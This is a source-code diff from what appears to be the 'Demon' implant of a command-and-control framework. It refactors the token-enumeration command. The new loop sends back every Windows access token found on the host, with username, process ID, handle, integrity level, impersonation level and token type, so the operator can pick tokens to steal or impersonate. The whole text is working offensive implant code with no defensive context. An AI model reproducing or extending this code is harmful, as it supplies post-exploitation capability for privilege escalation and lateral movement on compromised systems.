@@ -1369,6 +1369,8 @@ VOID CommandToken( PPARSER Parser )
             PackageAddInt32( Package, NewTokenID );
             PackageAddInt32( Package, TargetPid );
 
+            DATA_FREE( UserDomain.Buffer, UserDomain.Length )
+
             break;
         }
 
@@ -1591,7 +1593,7 @@ VOID CommandToken( PPARSER Parser )
 
         case DEMON_COMMAND_TOKEN_FIND_TOKENS: PUTS( "Token::FindTokens" )
         {
-            PUniqueUserToken TokenList    = NULL;
+            PUSER_TOKEN_DATA TokenList    = NULL;
             DWORD            NumTokens    = 0;
             BOOL             Success      = FALSE;
             DWORD            NumDelTokens = 0;
@@ -1604,44 +1606,22 @@ VOID CommandToken( PPARSER Parser )
 
             if ( Success )
             {
-                // TODO: this can surely be more efficient
+                PackageAddInt32( Package, NumTokens );
 
                 for (i = 0; i < NumTokens; ++i)
                 {
-                    if ( TokenList[ i ].delegation_available )
-                        NumDelTokens++;
-                    if ( TokenList[ i ].impersonation_available )
-                        NumImpTokens++;
-                }
-
-                PackageAddInt32( Package, NumDelTokens );
-
-                for (i = 0; i < NumTokens; ++i)
-                {
-                    if (TokenList[ i ].delegation_available)
-                    {
-                        PackageAddString( Package, TokenList[ i ].username );
-                        PackageAddInt32( Package, TokenList[ i ].dwProcessID );
-                        PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) TokenList[ i ].localHandle );
-                    }
-                }
-
-                PackageAddInt32( Package, NumImpTokens );
-
-                for (i = 0; i < NumTokens; ++i)
-                {
-                    if (TokenList[ i ].impersonation_available)
-                    {
-                        PackageAddString( Package, TokenList[ i ].username );
-                        PackageAddInt32( Package, TokenList[ i ].dwProcessID );
-                        PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) TokenList[ i ].localHandle );
-                    }
+                    PackageAddWString( Package, TokenList[ i ].username );
+                    PackageAddInt32( Package, TokenList[ i ].dwProcessID );
+                    PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) TokenList[ i ].localHandle );
+                    PackageAddInt32( Package, TokenList[ i ].integrity_level );
+                    PackageAddInt32( Package, TokenList[ i ].impersonation_level );
+                    PackageAddInt32( Package, TokenList[ i ].TokenType );
                 }
             }
 
             if ( TokenList )
             {
-                DATA_FREE( TokenList, NumTokens * sizeof( UniqueUserToken ) );
+                DATA_FREE( TokenList, NumTokens * sizeof( USER_TOKEN_DATA ) );
             }
 
             break;
